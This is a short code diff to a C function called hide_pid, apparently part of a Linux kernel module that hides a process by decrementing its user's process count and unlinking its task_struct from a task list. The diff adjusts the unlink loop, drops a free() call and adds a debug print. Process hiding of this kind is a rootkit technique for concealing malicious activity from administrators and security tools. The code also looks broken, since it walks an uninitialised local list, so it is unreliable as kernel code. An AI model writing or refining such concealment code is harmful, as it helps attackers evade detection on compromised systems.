@@ -78,8 +78,6 @@ hide_pid(pid_t pid)
     struct list_head *pos, *q;
     struct task_struct mylist;
 
-
-
     rcu_read_lock();
     atomic_dec(&__task_cred(ts)->user->processes);
     rcu_read_unlock();
@@ -87,9 +85,10 @@ hide_pid(pid_t pid)
     write_lock_irq(rwlock);
     list_for_each_safe(pos, q, &mylist.tasks){
         tmp= list_entry(pos, struct task_struct, tasks);
-        if (pos == ts)
+        if (((struct task_struct *)pos) == ((struct task_struct *)ts)) {
             list_del(pos);
-        free(tmp);
+            DEBUG_INFO("FOUND\n");
+        }
     }
     write_unlock_irq(rwlock);
 }
